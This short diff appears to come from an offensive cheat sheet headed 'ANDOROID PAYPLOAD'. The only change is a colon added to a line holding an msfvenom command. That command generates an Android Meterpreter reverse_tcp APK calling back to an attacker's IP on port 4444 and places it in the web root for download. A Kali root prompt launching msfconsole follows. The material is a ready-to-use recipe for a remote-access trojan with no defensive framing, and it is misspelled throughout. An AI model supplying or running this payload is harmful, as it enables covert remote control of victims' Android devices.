@@ -1,5 +1,5 @@
                                                              "ANDOROID PAYPLOAD"
-                       FOR ANDORID- msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip_address> LPORT=4444 R > /var/www/html/android.apk
+                       FOR ANDORID-: msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip_address> LPORT=4444 R > /var/www/html/android.apk
           
 ┌──(root㉿kali)-[~]
 └─# msfconsole
